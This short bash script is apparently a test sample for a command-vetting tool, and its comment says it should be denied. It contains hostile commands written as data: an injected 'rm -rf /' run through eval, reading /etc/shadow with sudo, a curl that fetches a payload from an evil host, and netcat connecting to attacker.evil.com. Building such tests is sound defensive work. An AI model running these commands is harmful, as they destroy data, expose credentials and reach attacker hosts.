#!/bin/bash
# Sample 07: Shell injection patterns.
# Should be DENIED (process_system, HIGH/CRITICAL).
USER_INPUT="; rm -rf /"
eval "ls $USER_INPUT"

sudo cat /etc/shadow

# Nested command substitution with variable expansion
HOST=$(curl ${EVIL_HOST}/payload)
echo $HOST

`whoami`

# Background process
nc attacker.evil.com 4444 &
